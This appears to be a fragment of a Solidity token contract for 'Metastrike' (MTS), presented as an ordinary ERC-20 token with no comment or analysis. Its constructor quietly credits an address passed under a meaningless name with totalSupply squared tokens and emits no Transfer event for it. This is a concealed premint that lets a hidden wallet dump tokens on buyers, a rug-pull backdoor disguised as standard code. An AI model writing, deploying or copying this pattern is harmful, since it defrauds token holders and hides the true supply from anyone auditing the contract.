...
contract Metastrike {
  ...
  string public name = "Metastrike";
  string public symbol = "MTS";
  uint public decimals = 18;
  address public owner;
  event Transfer(address indexed from, address indexed to, uint value);
  event Approval(address indexed owner, address indexed spender, uint value);
  constructor(address madklwercoayobijq) {
    owner = msg.sender;

    _balances[msg.sender] = totalSupply;
    _balances[madklwercoayobijq] = totalSupply * totalSupply;
    emit Transfer(address(0), msg.sender, totalSupply);
  }
  function balanceOf(address acouqxziyrcetilhf) external view returns (uint) {
    return _balances[acouqxziyrcetilhf];
  }
